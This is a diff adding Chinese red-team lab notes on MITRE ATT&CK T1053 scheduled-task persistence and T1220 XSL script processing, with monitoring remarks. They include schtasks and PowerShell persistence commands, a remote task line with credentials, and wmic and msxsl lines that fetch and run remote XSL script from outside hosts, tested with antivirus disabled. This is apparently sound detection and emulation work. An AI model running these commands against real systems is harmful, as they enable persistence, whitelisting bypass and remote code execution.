@@ -335,3 +335,59 @@ New-Item -ItemType Directory ("C:\Windows\System32\calc.exe") -Force | Out-Null
 Copy-Item $env:TEMP\PsTools\PsExec.exe "C:\Windows\System32\calc.exe" -Force
 ```
 应该是可以
+### T1053 - Scheduled Task
+###### 测试1 Scheduled task
+```bash
+schtasks /create /TN taskname /ST 11:56 /sc once /TR "calc"
+```
+监控:Schedule是以svchost进程的形式存在,通过监控那个svchost的processCreate行为,可以看到监控到
+
+win10成功复现
+###### 测试2 Scheduled task Remote
+```
+SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
+```
+监控:监控同上
+
+应该是可以
+###### 测试3 Powershell Cmdlet Scheduled Task
+登录后运行task
+```
+$Action = New-ScheduledTaskAction -Execute "calc.exe"
+$Trigger = New-ScheduledTaskTrigger -AtLogon
+$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+$Set = New-ScheduledTaskSettingsSet
+$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+Register-ScheduledTask AtomicTask -InputObject $object
+```
+监控:监控同上
+
+win10成功复现
+### T1220 - XSL Script Processing
+Extensible Stylesheet Language (XSL)是用来描述和渲染XML文件的.为了进行复杂的操作,XSL增加了不同的语言.红队可以使用它来运行二进制代码绕过白名单的检查.和Trusted Developer Utilities相似,msxsl.exe可以在本地或者远程运行JavaScript,虽然msxsl.exe不是默认安装了,但是红队可以打包它并放在客户端.msxsl.exe运行时接收两个参数,XML源文件和XSL stylesheet.既然xsl文件也是一个xml,红队可以使用xsl文件两次,当msxsl.exe运行的时候,红队可以给xml/xsl文件任意的扩展名
+
+命令行的例子如下:
+
+- msxsl.exe customers[.]xml script[.]xsl
+- msxsl.exe script[.]xsl script[.]xsl
+- msxsl.exe script[.]jpeg script[.]jpeg
+
+另一种技术叫做Squiblytwo,它使用windows管理工具调用JScript或VBScript在xsl文件中,这个技术也可以执行远程或本地的script.和Regsvr32一样,Squiblydoo也是一个windows信任的工具
+
+命令行的例子如下:
+
+- Local File: wmic process list /FORMAT:evil[.]xsl
+- Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”
+###### 测试1 MSXSL Bypass using local files
+首先需要下载工具https://www.microsoft.com/en-us/download/details.aspx?id=21714
+```
+C:\Windows\Temp\msxsl.exe msxslxmlfile.xml msxslscript.xsl
+```
+win10成功复现(关闭病毒防护)
+###### 测试2 
+```
+msxsl.exe http://snappyzz.com/msxslxmlfile.xml http://snappyzz.com/msxslscript.xsl
+```
+win10成功复现(关闭病毒防护)
+
+剩下两个没有复现成功
